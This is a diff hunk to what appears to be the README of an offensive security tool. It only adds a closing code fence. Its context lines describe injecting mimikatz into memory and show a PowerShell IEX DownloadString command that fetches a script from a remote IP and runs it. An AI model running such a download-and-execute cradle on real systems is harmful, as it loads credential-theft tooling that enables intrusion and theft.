@@ -7,6 +7,7 @@ disk, making it ideal for security assessments with minimal system footprint. Th
 2. Inject mimikatz into the memory:
 ```
 IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.165/Invoke-vshadow.ps1')
+```
 
 ## Usage
 ```
